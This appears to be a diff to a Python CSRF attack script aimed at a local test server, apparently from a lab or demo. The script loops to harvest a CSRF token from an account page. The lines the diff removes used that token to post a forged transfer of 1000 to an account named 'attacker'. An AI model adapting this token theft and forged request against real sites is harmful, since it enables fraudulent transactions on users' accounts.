@@ -8,12 +8,10 @@ token=""
 def start_token():
     global token
     while(True):
-        page=requests.get("http://localhost:60782/Account/Manage")
+        page=requests.get("http://localhost:33773/Account/Manage")
         tree = html.fromstring(page.content)
-        token=dict(tree.forms[0].inputs.items())["csrf_token"].value
+        token=page.headers["Set-Cookie"].split(';')[0].split('=')[1]
         print("got token {}".format(token))
-        r=requests.post("http://localhost:5000/transfer", data={'transfer':'1000', 'to':'attacker', 'csrf_token':token})
-        print(r.text)
         time.sleep(5)
 
 def main():
